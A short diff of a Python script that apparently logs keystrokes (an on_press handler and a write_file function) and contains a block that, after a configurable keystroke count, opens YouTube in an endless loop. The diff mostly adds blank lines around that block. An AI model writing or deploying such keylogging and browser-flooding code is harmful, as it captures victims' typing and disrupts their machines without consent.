@@ -29,10 +29,15 @@ def on_press(key):
         keys = []
 
 
+
     #browser repeat open
+
     if i>=10000000000:              #change the number here for it to activate after <your number> of alphabets.
+
         while True:
+
             webbrowser.open("https://www.youtube.com/")
+
         i=0
 
 def write_file(keys):
